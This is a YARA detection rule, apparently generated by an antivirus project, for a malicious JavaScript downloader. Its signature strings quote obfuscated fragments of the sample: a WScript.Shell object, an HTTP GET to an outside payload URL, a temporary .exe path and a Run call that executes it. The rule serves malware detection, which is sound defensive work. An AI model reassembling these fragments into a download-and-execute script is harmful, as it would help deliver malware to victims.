rule sig_20160328_91f8eee6d815adb96f91621b9c14d185 {
  meta:
    description = "datamaliciousorder - file 20160328_91f8eee6d815adb96f91621b9c14d185.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "942eed1a2848718288c7d8080d1179cc242362eaf21dc06d7788c17d61388ae0"

  strings:
    $s1  = "function Koaamu() {return Itdzg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VTUc0nelWYgfGJw.exe\";};" fullword ascii
    $s2  = "Ipqnxxjlv[Sticqm](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "function Toesuoqta(Dhikut, Dyubmqsdbu){return Dhikut - Dyubmqsdbu;};" fullword ascii
    $s4  = "do {WScript[Gywqg](Ctecaanvt() * 11)} while (Ipqnxxjlv[\"readystate\"] < 4 );" fullword ascii
    $s5  = "var Itdzg = function Kdvnxofy() {return WScript[Gwweca](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nhgevepudp(Uecbyccwga){Itdzg[\"Run\"](Uecbyccwga, Fgebvg, Fgebvg);};" fullword ascii
    $s7  = "function Nscff() {return ((Oijvkvo == true) && (Oijvkvo == Iacyiyzfo)) ? 1 : Fgebvg;};" fullword ascii
    $s8  = "var Kgwehkrt = new this[\"Date\"]();" fullword ascii
    $s9  = "Iacyiyzfo = true; " fullword ascii
    $s10 = "Oijvkvo = true; " fullword ascii
    $s11 = " while (Zebwdp){" fullword ascii
    $s12 = "function Lmxckpltut()" fullword ascii
    $s13 = "var Oijvkvo = false;" fullword ascii
    $s14 = "var Iacyiyzfo = false;" fullword ascii
    $s15 = "var Rufcr = false;" fullword ascii
    $s16 = "return Toesuoqta(Szsbiwim, Xfnqyfwvt);" fullword ascii
    $s17 = "function Wbbyv(Oiralofflw) {var Uqbgaapwvf = (1, 2, 3, 4, 5, Oiralofflw); return Uqbgaapwvf;};" fullword ascii
    $s18 = "function Awsupamas(){return Fbigzulytg;};" fullword ascii
    $s19 = "} catch(Bnygzwcgm){Zebwdp = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "function Ctecaanvt(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}